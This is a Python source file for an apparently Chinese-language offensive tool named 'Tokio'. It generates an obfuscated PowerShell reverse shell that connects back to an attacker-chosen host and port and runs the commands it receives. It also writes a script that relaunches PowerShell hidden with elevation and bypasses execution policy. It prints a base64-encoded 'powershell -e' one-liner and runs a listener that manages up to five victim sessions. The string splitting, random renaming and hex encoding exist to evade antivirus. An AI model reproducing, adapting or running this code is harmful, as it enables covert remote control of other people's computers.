import random
import time
import uuid
import base64
import argparse
import logging
import subprocess
from tqdm import tqdm
from colorama import init, Fore
import string
import socket
import threading
init(autoreset=True)

parser = argparse.ArgumentParser(description="东京下小雨")
parser.add_argument('-l', '-local', type=str, required=True, help='本地机器')
parser.add_argument('-p', '-port', type=int, help='本地连接端口')
parser.add_argument('-r', '-raw', choices=["raw"], required=False, help="原始输出[纯文本]")
parser.add_argument('-n', '-ngr', choices=["ngrok"], required=False, help="Ngrok隧道")
args = parser.parse_args()

if not args.p:
    print(f"\n[!] {Fore.RED}\033[1m注意:{Fore.RESET} 默认端口为4444.")
    args.p = 4444
time.sleep(0.5)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def Pro_Colors():
    yellow = Fore.YELLOW
    red = Fore.RESET
    normal = Fore.RESET
    cyan = Fore.CYAN
    lightblue = Fore.LIGHTBLUE_EX
    green = Fore.GREEN
    return yellow, red, normal, cyan, lightblue, green

Yellow, Red, Normal, l_cyan, LightBlue, Green = Pro_Colors()

MAIN = "├──"
TEE2 = "└──"
SPACE_PREFIX = "   "

def TOKIO():
    print(f'''  _____           _      _         
 |_   _|   ___   | | __ (_)   ___  
   | |    / _ \  | |/ / | |  / _ \ 
   | |   | (_) | |   <  | | | (_) |
   |_|    \___/  |_|\_\ |_|  \___/ 
                                   ''')

def Generate_uuids():
    random_uuid = []
    for _ in range(10):
        random_uuid.append("$" + str(uuid.uuid4()))
    random_uid_get = random.choice(random_uuid)
    time.sleep(0.7)
    return random_uid_get

def spl_uuid():
    uids = Generate_uuids()
    print(f"\n随机UUID => {uids}")
    split_uuid = uids.split("-")[0]
    return split_uuid

def random_strings():
    random_names = string.ascii_letters
    random_length = random.randrange(6, 12)
    char2 = ''
    for char in range(random_length):
        char2 += random.choice(random_names)
    return char2

def random_choice(variables):
    dict_variables = {}
    for i in range(variables):
        dict_variables[i] = random_strings()
    return dict_variables

strings = random_strings()
random_string_pickup = random_choice(variables=5)

Command0 = ['$str = "TcP"+"C"+"li"+"e"+"nt";', '$reversed = -join ($str[-1..-($str.Length)])']
Command1 = ['$a = IEX $env:', 'SystemRoot\SysWow64\??ndowsPowerShe??', '\\v1.0\powershe??.exe;']
Command2 = ['$client = New-Object ', 'System.Net.Sockets.', 'TCPClient("0.0.0.0",0000)']
Command3 = ['$stream = ', '$client.GetStream();', '[byte[]]$bytes = 0..65535|%{0};']
Command4 = ['while(($i = $stream.Read($bytes, 0, $bytes.Length))', '-ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding)', '.GetString($bytes,0, $i);']
Command5 = ['$data = (New-Object -TypeName System.Text.ASCIIEncoding)', '.GetString($bytes,0, $i);']

WordCharSystem1 = ["SysTemROot", "Syste?????", "Syst??r??t", "SyS?em?oo?", "SYSTEmRoot", "Sys???r???"]
WordCharSystem2 = ["SysWoW??", "SYSW?W6?", "SySwO???", "SYSW????"]
WordCharSystem3 = ["Ne''w-O''bje''ct", "N''ew-O''bj''ec''t", "N'e'W'-'o'B'J'e'C'T'",
                   "&('N'+'e'+'w'+'-'+'O'+'b'+'J'+'e'+'c'+'t')", "NeW-oB''JeCT", "&('New'+'-ObJect')"]
WordCharSystem4 = ["Sy''st''em.Net.Soc''kets.TcPClIeNt", "SyS''tEm.Net.SoC''kE''tS.TCPCLIENT",
                   "Sy''St''Em.NeT.So''CkE''tS.TCpCLient", "Sy''St''Em.NeT.So''CkE''tS.$str"]
WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')", "('G'+'e'+'T'+'S'+'T'+'r'+'e'+'am')"]
WordCharSystem6 = ["Sys''t''em.Te''xt.AS''CI''IEn''co''ding", "Sy''Ste''M.tExT.A''SCi''iEN''coding"]
WordCharSystem7 = ["$41b394758330c8=$3757856aa482c79977", "$37f=$91a10810c37a0f=$946c88e=$ecf0bb86"]
WordCharSystem8 = ["$3dbfe2ebffe072727949d7cecc51573b", "$b15ff490cfd2aa65358d2e5e376c5dd2"]
WordCharSystem9 = spl_uuid()

C0 = ''.join(Command0).strip()
C1 = ''.join(Command1).strip()
C2 = ''.join(Command2).strip()
C3 = ''.join(Command3).strip()
C4 = ''.join(Command4).strip()
C5 = ''.join(Command5).strip()

if "SYSTEMROOT" or "SystemRoot" in C1:
    repl = random.choice(WordCharSystem1)
if "SysWow64" in C1:
    repl2 = random.choice(WordCharSystem2)
if "New-Object" in C2:
    repl3 = random.choice(WordCharSystem3)
if "System.Net.Sockets" in C2:
    repl4 = random.choice(WordCharSystem4)
if "GetStream" in C3:
    repl5 = random.choice(WordCharSystem5)
if "System.Text.ASCIIEncoding" in C4:
    repl6 = random.choice(WordCharSystem6)

repl7 = None
repl8 = None
repl9 = None

def Bomb():
    try:
        logger.info(f"\n{Red}{MAIN}{Normal} 计算字符串...")
        with open('Payload.ps1', 'r') as file:
            spl = file.read()
            words_to_check = ["SYSTEMROOT", "New-Object", "GetStream", "ASCII", "System.Net.Sockets", "$client", "$sendback", "$data"]
            word_to_update = [repl, repl3, repl5, repl6, repl4, repl7, repl8, repl9]
            num_words_to_check = len(words_to_check)
            time.sleep(1)
            print(f"{SPACE_PREFIX}{Yellow}{TEE2}{Normal}检查可替换词汇....")
            time.sleep(0.5)
            with tqdm(total=num_words_to_check, bar_format="{l_bar}{bar}{r_bar}", colour='YELLOW') as pbar:
                for i, word in enumerate(words_to_check):
                    pbar.update(1)
                    time.sleep(0.001)
                    if word not in spl:
                        pbar.write(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{i + 1}. {word} - {Yellow}已替换{Normal} -->> {word_to_update[i]}")
                    time.sleep(1)
        print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{LightBlue}{Normal}请稍候...")
        time.sleep(1.5)
        print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{l_cyan}{TEE2}{Normal}载荷生成完成...... ↓\n")
        time.sleep(1.5)
    except Exception as e:
        logger.error(e)

def Execute_privilege():
    with open('Privilege.ps1', 'w') as run:
        run.write(f'{privilege}')
    run.close()

def Execute_Payload():
    with open('Payload.ps1', 'w') as run2:
        run2.write(f"{C0};\n")
        run2.write('''$Tokio = @("54", "43", "50", "43", "6C", "69", "65", "6E", "74");\n''')
        run2.write("$TChar = $Tokio | ForEach-Object { [char][convert]::ToInt32($_, 16) };\n")
        run2.write("$TokioChar = -join $TChar;\n")
        run2.write(f";${random_string_pickup[0]} = {repl3} {repl4}('{args.l}',{args.p});\n")
        run2.write(f"${random_string_pickup[2]} = ${random_string_pickup[0]}.{repl5}();[byte[]]$TokioChar = 0..65535|%" + "{0};\n")
        run2.write(f"while(($i = ${random_string_pickup[2]}.ReAd($TokioChar, 0, $TokioChar.LeNgTh)) -ne 0)" + "{;\n")
        run2.write(f"$data = ({repl3} -TypENAme " + f"{repl6}).('Ge'+'tStRinG')($TokioChar,0, $i);\n")
        run2.write(f'''$sendback = (iex ". {{  $data  }} 2>&1" | Ou''t-Str''ing );\n''')
        run2.write(f"$J=$O=$K=$E=$R=$P=$W=$R = ${{sendback}} + '{LightBlue}TokioShell{Normal} ' + (pwd).Path + '> ';\n")
        run2.write('''$s = ("{0}{1}{3}{2}"-f "se''nd","by","e","t"); $s = ([text.encoding]::ASCii).GetBYTeS($R);\n''')
        run2.write(f"${random_string_pickup[2]}.Write($s,0,$s.Length);${random_string_pickup[2]}.Flush()"+"};"+f"${random_string_pickup[0]}.Close()\n")
    run2.close()
    time.sleep(1)

def Change_Payload(x):
    global repl7, repl8, repl9
    repl7 = random.choice(WordCharSystem7)
    repl8 = random.choice(WordCharSystem8)
    repl9 = WordCharSystem9
    with open(x, "r") as file:
        file_content = file.read()
    file_content = file_content.replace("$client", repl7)
    file_content = file_content.replace("$sendback", repl8)
    file_content = file_content.replace("sendback", repl8.split("$")[1])
    file_content = file_content.replace("$data", repl9)
    with open(x, 'w') as file:
        file.write(file_content)

def Raw_Payload(x):
    with open(x, "r") as f:
        file = f.read()
        print(file)

def B64(FTD):
    with open(FTD, 'rb') as file:
        file_content = file.read()
    return base64.b64encode(file_content).decode('utf-8')

def start_server():
    sessions = {}
    hostname = '0.0.0.0'
    if not args.n:
        port = args.p
    else:
        port = int(input(f"[?] {l_cyan}请输入监听端口:{Normal} "))
    max_sessions = 5

    server_socket = socket.socket()
    server_socket.bind((hostname, port))
    server_socket.listen(5)
    print(f"\n{Red}[Tokio]{Normal} 正在监听 {hostname}:{port}")

    def accept_connections():
        while len(sessions) < max_sessions:
            client_socket, addr = server_socket.accept()
            session_id = len(sessions) + 1
            sessions[session_id] = [client_socket, addr]
            print(f"\n[成功] 接受来自 {addr[0]}:{addr[1]} 的连接\n")

    def handle_buffer(x):
        x = b''
        while True:
            information = client_socket.recv(1024)
            x += information
            if len(information) < 1024:
                break
        return x

    threading.Thread(target=accept_connections, daemon=True).start()

    waiting_message_printed = False
    while True:
        if not sessions:
            if not waiting_message_printed:
                logger.info(f"{Yellow}等待会话中...{Normal}")
                waiting_message_printed = True
            continue
        else:
            if waiting_message_printed:
                waiting_message_printed = False

        try:
            for session_id, (client_socket, session_addr) in sessions.items():
                logger.info(f"活动会话 --> [会话ID::{session_id}, {session_addr[0]}::{session_addr[1]} ]")
            print(f"{Yellow}[提示]:{Normal} 按CTRL+C切换会话")
            print(f"{Fore.LIGHTMAGENTA_EX}[提示]:{Normal} 输入0将终止所有会话")
            print(f"{LightBlue}---{Normal}" * 15)

            userinput = int(input(f"{Green}[?] 选择会话 (1-{len(sessions)}) 或输入0退出:{Normal} "))
            if userinput == 0:
                print(f"{Red}\n[东京下小雨]{Normal}\n{Yellow}9Insomnie{Normal}\nGitHub\n{LightBlue}感谢使用!{Normal}")
                for session_ends, (client_socket, client_address) in sessions.items():
                    client_socket.close()
                exit(0)

            if userinput in sessions:
                client_socket, addr = sessions[userinput]
                while True:
                    try:
                        command = input(f"{addr[0]}:{addr[1]} >>> {LightBlue}[Tokio会话]{Normal} {Yellow}{userinput}:{Normal} ")
                        if command.lower() == "quit":
                            client_socket.close()
                            del sessions[userinput]
                            logger.info(f"[!]Tokio会话 {userinput} 已断开!")
                            break
                        client_socket.send(command.encode())
                        response = handle_buffer(client_socket).decode('utf-8')
                        print(response)

                    except KeyboardInterrupt:
                        print("\n[?]切换Tokio会话中...")
                        time.sleep(2)
                        break
                    except (ConnectionResetError, BrokenPipeError):
                        logger.info(f"[!]Tokio会话 {userinput} 已断开!")
                        del sessions[userinput]
                        break
            else:
                logger.error("[!] 错误的会话ID.")
        except ValueError:
            print("请输入有效的会话编号或输入0退出.")

privilege = '''
param([switch]$Elevated)

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    Unblock-File '.\Privilege.ps1'
}

if ((Test-Admin) -eq $false)  {
    if ($elevated) {
    } else {
        Start-Process $env:''' + f'''{repl}\\''' + f'''\\{repl2}''' + '''\\??ndowsPowerShe??\\v1.0\powershe??.exe -Verb RunAs -ArgumentList ('-noprofile -WindowStyle hidden -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    }
    exit
}

Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
$encodedCommand = 'BASE64_ENCODED_COMMAND_HERE'
$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
'''

def main():
    Execute_privilege()
    Execute_Payload()
    Change_Payload("Payload.ps1")
    TOKIO()
    Bomb()
    FP = 'Payload.ps1'
    B64(FTD=FP)
    time.sleep(0.5)
    print(f"[+] {Yellow}提示{Normal}: 使用方式: powershell -w hidden -EncodedCommand [PAYLOAD]")
    print("载荷 -> 复制并运行:\n")
    command = "iconv -f ASCII -t UTF-16LE Payload.ps1 | base64 -w 0"
    base64_payload = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    base_bytes_out, base_err = base64_payload.communicate()
    if args.r == "raw":
        Raw_Payload(x=FP)
    else:
        print(f"powershell -e {base_bytes_out.decode('utf-8')}")
    time.sleep(0.5)
    start_server()

if __name__ == '__main__':
    main()
    subprocess.Popen('rm -r Payload.ps1', shell=True)
